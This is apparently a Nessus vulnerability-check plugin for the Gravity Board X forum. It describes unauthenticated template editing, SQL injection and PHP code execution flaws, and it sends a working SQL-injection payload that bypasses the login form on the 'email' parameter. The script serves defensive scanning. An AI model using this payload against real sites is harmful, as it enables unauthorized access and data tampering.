#
# (C) Tenable Network Security
#


if (description) {
  script_id(19400);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2562", "CVE-2005-2563", "CVE-2005-2564", "CVE-2005-2565");
  script_bugtraq_id(14497, 14499, 14502);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"18625");
    script_xref(name:"OSVDB", value:"18626");
    script_xref(name:"OSVDB", value:"18627");
    script_xref(name:"OSVDB", value:"18628");
    script_xref(name:"OSVDB", value:"18629");
    script_xref(name:"OSVDB", value:"18630");
    script_xref(name:"OSVDB", value:"18631");
    script_xref(name:"OSVDB", value:"18632");
    script_xref(name:"OSVDB", value:"18633");
    script_xref(name:"OSVDB", value:"18634");
    script_xref(name:"OSVDB", value:"18635");
  }

  name["english"] = "Gravity Board X <= 1.1 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running Gravity Board X, an open-source, web-based
electronic forum written in PHP. 

The version of Gravity Board X installed on the remote host suffers
from several flaws, including :

  - Unauthorized Access Vulnerability
    The 'editcss.php' script does not require authentication 
    before writing user-supplied input to template files. By
    exploiting this flaw, an attacker may be able to deface
    the affected site or run arbitrary PHP code (see below).

  - SQL Injection Vulnerability
    The application does not sanitize user-supplied input to 
    the 'email' parameter of the 'index.php' script before 
    using it in database queries. By exploiting this flaw, 
    an attacker can bypass authentication and possibly 
    disclose or modify data or launch attacks against the 
    underlying database.

  - Arbitrary PHP Code Execution Vulnerability
    Using either of the two previous flaws, an attacker 
    can inject arbitrary PHP code into template files,
    which will then be executed on the remote host within 
    the context of the web server userid with each page
    view.

See also : 

http://www.retrogod.altervista.org/gravity.html
http://archives.neohapsis.com/archives/bugtraq/2005-08/0100.html

Solution : 

Unknown at this time.

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in Gravity Board X <= 1.1";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to call the affected script.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  # If it looks like Gravity Board X...
  if (
    '<form method="POST" action="index.php' >< res &&
    "Gravity Board X | Powered By" >< res
  ) {
    # Try to bypass authentication.
    postdata = raw_string(
      "email=", urlencode(str:"' or isnull(1/0) /*"), "&",
      "pw=", SCRIPT_NAME
    );
    req = string(
      "POST ", dir, "/index.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we're now logged in.
    if ("href=index.php?action=logout><font class=navfont>Logout" >< res) {
      security_hole(port);
      exit(0);
    }
  }
}
